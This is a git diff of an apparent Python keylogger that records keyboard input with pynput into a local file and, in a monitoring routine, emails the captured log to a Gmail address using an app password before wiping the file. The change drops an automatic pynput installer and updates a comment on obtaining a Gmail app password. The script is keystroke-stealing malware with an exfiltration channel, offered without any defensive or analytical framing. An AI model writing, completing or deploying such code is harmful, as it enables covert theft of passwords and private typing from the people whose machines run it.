@@ -5,22 +5,6 @@ import threading
 import time
 import os
 from os.path import exists
-import subprocess
-import sys
-
-
-def install_package(package):
-    try:
-        import importlib
-        importlib.import_module(package)
-    except ImportError:
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-        except subprocess.CalledProcessError as e:
-            print(f"Failed to install {package}. Error: {e}")
-
-
-install_package('pynput')
 from pynput import keyboard
 
 log_file = 'l.txt'
@@ -75,7 +59,7 @@ def monitor_log_file():
                 body=log_content,
                 to_email='RECIPIENT_GMAIL@gmail.com',  # Replace with your recipient email
                 from_email='SENDER_GMAIL@gmail.com',  # Replace with your email
-                password='APP_PASSWORD'  # Replace with your email password or app-specific password
+                password='APP_PASSWORD'  # Replace with your app password - https://support.google.com/accounts/answer/185833?visit_id=638586207562879682-2494561833&p=InvalidSecondFactor&rd=1
             )
             open(log_file, 'w').close()
 
